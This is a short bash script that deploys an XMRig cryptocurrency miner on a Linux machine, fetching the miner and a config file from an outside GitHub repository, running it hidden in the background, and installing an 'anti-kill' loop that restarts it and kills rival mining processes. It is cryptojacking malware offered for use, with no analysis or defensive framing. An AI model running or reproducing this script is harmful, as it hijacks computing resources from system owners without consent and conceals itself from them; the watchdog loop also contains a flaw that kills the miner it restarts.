#!/bin/bash

xmrver="6.22.2"
repo_url="https://raw.githubusercontent.com/gorguzaaaaz/texniaz/refs/heads/main"

if [ -d /tmp ]; then
    echo "/tmp exists"
else
    sudo -n mkdir /tmp
    sudo -n chmod 777 /tmp
fi

unalias -a
sudo -n apt update
sudo -n apt install -y wget util-linux
sudo -n apk add wget util-linux
sudo -n dnf install wget util-linux

if command -v wget >/dev/null 2>&1; then
    DOWNLOAD_CMD="wget"
else
    DOWNLOAD_CMD="curl -OL"
fi

mkdir -p /tmp/xmrig
cd /tmp/xmrig

$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
cd xmrig-$xmrver
chmod +x xmrig

rm -f config.json
$DOWNLOAD_CMD $repo_url/config.json
randnum=$(( RANDOM % 1000 + 1 ))
sed -i "s/kasm/kasm-$randnum/g" config.json

nohup ./xmrig > /dev/null 2>&1 &

# Anti-Kill Script
cd /tmp
cat <<EOF > anti-kill.sh
#!/bin/bash
while true; do
    if ! pgrep xmrig >/dev/null; then
        nohup /tmp/xmrig/xmrig-$xmrver/xmrig > /dev/null 2>&1 &
    fi
    pkill -f minerd
    pkill -f crypto
    pkill -f xmrig
    sleep 10
done
EOF
chmod +x anti-kill.sh
nohup bash anti-kill.sh > /dev/null 2>&1 &
